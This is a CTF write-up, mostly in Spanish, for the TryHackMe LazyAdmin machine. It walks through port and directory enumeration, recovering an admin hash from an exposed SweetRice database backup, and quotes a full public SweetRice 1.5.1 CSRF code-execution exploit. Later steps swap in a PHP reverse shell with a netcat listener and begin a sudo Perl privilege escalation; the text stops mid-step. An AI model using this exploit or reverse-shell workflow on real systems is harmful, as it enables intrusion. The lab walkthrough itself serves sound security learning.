# Lazy Admin WriteUp
### Español & English



## Enumeración

#### :ship: Nmap - Enumeración de puertos
Para la enumeración de puertos de la máquina utilizaremos nmap, una herramienta que nos permite scanear los puertos abiertos y los servicios que corren en una dirección IP. Comenzaremos con enumerar los primeros 1000 puertos con el siguiente comando:

```console
kimera@vault:~/Machines/THM/LazyAdmin/nmap$ nmap -n -T4 -p 1-1000 10.10.109.87 -oN portenum

Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 22:21 UTC
Nmap scan report for 10.10.109.87
Host is up (0.076s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Con `-n` especificamos que no se realice nunca la resolución de DNS lo que agiliza el proceso de escaneo, con `-T4` especificamos el nivel de agresividad y evitamos que el tiempo de expiración de los sondeos en los puertos TCP no excedan de 10ms. Por útltimo guardamos los resultados en el archivo `portenum` en formato nmap con el argumento `-oN`.


Ahora procedemos con la enumeración de los servicios y sus versiones de cada uno de los puertos abiertos que previamente habiamos encontrado:

```console
kimera@vault:~/Machines/THM/LazyAdmin/nmap$ nmap -sC -sV -p22,80 10.10.109.87 -oN portdetails

Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-14 22:38 UTC
Nmap scan report for 10.10.109.87
Host is up (0.076s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.06 seconds
```

#### :page_with_curl: Wfuzz - Enumeración de directorios

Como podemos observar existe un servicio http por el puerto 80 al que podemos acceder con la URL `http://10.10.109.87:80`en nuestro navegador:

![alt text](https://github.com/k1m3rA321/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/index.png)

Accedemos a la página de defecto del servidor Apache2.

En este punto comencé a buscar archivos `robots.txt`, `login.php`o directorios como `/uploads` que son bastante counes en los CTFs, pero no obtuve resultados.

Para la enumeración de directorios utilizaremos wfuzz como herramienta de fuzzeo. Las wordlists que empleé fueron dos, con la primera (`/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`) no obtuve resultados ya sin especificar extensión o con las extensiones `php`y `html`. Con la segunda wordlist (`/usr/share/wfuzz/wordlist/general/common.txt`) si que salieron resultados:

```console
kimera@vault:~/Machines/THM/LazyAdmin/web$ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc=404,302 http://10.10.109.87/FUZZ

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.98.202/FUZZ
Total requests: 949

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                                                   
===================================================================

000000204:   301        9 L      28 W     314 Ch      "content"                                                                                                                                                                 

Total time: 15.05663
Processed Requests: 949
Filtered Requests: 948
Requests/sec.: 63.02869
```

Si fuzzeamos de nuevo este directorio podemos acceder a otros archivos ocultos:

```console
kimera@vault:~/Machines/THM/LazyAdmin/web$ wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc=404,302 http://10.10.98.202/content/FUZZ

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.98.202/content/FUZZ
Total requests: 949

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                                                                   
===================================================================

000000412:   301        9 L      28 W     321 Ch      "images"                                                                                                                                                                  
000000416:   301        9 L      28 W     318 Ch      "inc"                                                                                                                                                                     
000000454:   301        9 L      28 W     317 Ch      "js"                                                                                                                                                                      

Total time: 21.64260
Processed Requests: 949
Filtered Requests: 946
Requests/sec.: 43.84869
```


Primero revisamos la URL `http://10.10.109.87/content`, donde podemos deducir que se utiliza el gestor de contenido SweetRice:

![alt text](https://github.com/k1m3rA321/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/sweetrice.png)

Al inspeccionar la página podemos encontrar un link de un archivo escrito en JavaScript (`.js`) debajo del tag de <title>.
Si nos fijamos en la ubicación del archivo podemos encontrarnos con el directorio que previamente habiamos fuzzeado.
  
Revisando el archivo `SweetRice.js` se ve una versión desde el que se utiliza el script (`0.5.4`). Con la idea de encontrar credenciales, con el atajo `Ctrl+F`filtramos la palabra `pass` con la que se obtienen dos resultados, sin embargo no hay ninguna contraseña o usuario.

Si revisas cuidadosamente los demás scripts alojados en `http://10.10.109.87/content/js`puedes sacar también el directorio de `/images`.
Mirando los archivos en `/images`no encontramos nada que nos revele datos que puedan vulnerar la máquina.

Por último, nos faltaría revisar el directorio `/inc` en el que encontremos diferentes carpetas y archivos en formato `.php`:


![alt text](https://github.com/k1m3rA/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/inc.png)

Si accedemos al archivo de texto con nombre `lastest.txt`podemos listar una versión, que como dice el nombre sería la más reciente de uno de los servicios que corre la página web. El servicio que habíamos encontrado previamente es el CMS SweetRice. Lo cual nos servirá mas adelante para buscar exploits relacionados con esta versión (`1.5.1`).

También podemos encontrar una carpeta con nombre `mysql_backup`, dentro de esa carpeta podemos descargar la copia de seguridad de una base de datos:

![alt text](https://github.com/k1m3rA321/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/mysql.png)

Con el comando `strings`listamos todos los caracteres imprimibles del archivo:

```console
kimera@vault:~/Machines/THM/LazyAdmin/web$ strings mysql_bakup_20191129023059-1.5.1.sql 
```

![alt text](https://github.com/k1m3rA/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/creds.png) 

Si buscamos entre los resultados podemos encontrar una línea con el nombre de usuario de la cuenta admin (`manager`) y un hash md5 de la contraseña (`42f749ade7f9e195bf475f37a44cafcb`). El hash lo podemos decodificar [aquí](https://crackstation.net/).

![alt text](https://github.com/k1m3rA321/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/hash.png)

## Exploitation

#### :collision:Método - 1


Como ya obtuvimos qué versión de SweetRice se está empleando podemos comprobar si ésta es vulnerable. Una simple búsqueda en Google nos dará varios resultados:

![alt text](https://github.com/k1m3rA321/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/google.png)

En este método nos centraremos en el tercer enlace, el cual nos detalla el procedimiento a seguir para obtener un Code Execution:

```
<!--
# Exploit Title: SweetRice 1.5.1 Arbitrary Code Execution
# Date: 30-11-2016
# Exploit Author: Ashiyane Digital Security Team
# Vendor Homepage: http://www.basic-cms.org/
# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
# Version: 1.5.1


# Description :

# In SweetRice CMS Panel In Adding Ads Section SweetRice Allow To Admin Add
PHP Codes In Ads File
# A CSRF Vulnerabilty In Adding Ads Section Allow To Attacker To Execute
PHP Codes On Server .
# In This Exploit I Just Added a echo '<h1> Hacked </h1>'; phpinfo(); 
Code You Can
Customize Exploit For Your Self .

# Exploit :
-->

<html>
<body onload="document.exploit.submit();">
<form action="http://localhost/sweetrice/as/?type=ad&mode=save"
method="POST" name="exploit">
<input type="hidden" name="adk" value="hacked"/>
<textarea type="hidden" name="adv">
<?php
echo '<h1> Hacked </h1>';
phpinfo();?>
</textarea>
</form>
</body>
</html>

<!--
# After HTML File Executed You Can Access Page In
http://localhost/sweetrice/inc/ads/hacked.php
  -->
```

Tal y como lo describe necesitamos tener acceso a una cuenta admin del CMS para luego acceder al panel de ads. Una vez ahí subir el codigo que nos dará una reverse shell sustituyendo `<?php echo '<h1> Hacked </h1>'; phpinfo();?>`por nuestro código. En mi caso utilicé `/usr/share/webshells/php/php-reverse-shell.php` cambiando los parámetros de la IP con mi dirección y el puerto por el 1234.


![alt text](https://github.com/k1m3rA321/WriteUps/blob/master/TryHackMe/LazyAdmin/resources/img/exploit1.png)


Una vez hayamos subido el archivo ponemos en escucha el puerto `1234` con netcat:



```console
kimera@vault:~/Machines/THM/LazyAdmin/exploit$ nc -nlvp 1234
listening on [any] 1234 ...
```

Y entramos en la URL donde se aloja el archivo que recién subimos: `http://10.10.109.87/content/inc/ads/reverse.php`. Con esto deberíamos haber obtenido una shell.

#### :collision:Método - 2

Para este segundo método utilizaremos el primer enlace de la búsqueda que hicimos previamente. Este nos proprciona un exploit escrito en Python, el cual, cuando lo ejectutemos con el comando `python nombreexploit.py`, nos pedirá el host que en nuestro caso es `10.10.109.87/content`que nos lo pedirá entre comillas, así como el resto de parámetros necesarios: usuario, contraseña, nombre del archivo que queramos subir. En mi caso utilizaré de nuevo una reverse shell en php.

Ponemos en escucha el puerto con el que configuramos la reverse shell y visitamos la URL que nos proporciona el output del exploit.

#### Primera Flag

Con el comando `id`podemos ver que somos el usuario `www-data`. Para la escalación de privilegios procedemos con alguna enumeracón básica de linux. Con el comando `sudo -l`podemos ver que comandos podemos correr con permisos de root.

Nos dirigimos al directorio home para ver a que carpeta de directorios de usuario tenemos acceso y vemos que la de itguy es accesible. Dentro de este usuario encontramos la primera flag:

#### Escalación de privilegios

```console
$ sudo -l

Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```

Como podemos ver, el usuario www-data puede ejecutar un archivo escrito en perl. Este archivo lo podemos modificar para obtener una nueva reverse shell pero esta vez con permisos de root. Para previsualizar el contenido de este archivo podemos hacer un cat:

```console
$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

sudo /usr/bin/perl /home/itguy/backup.pl



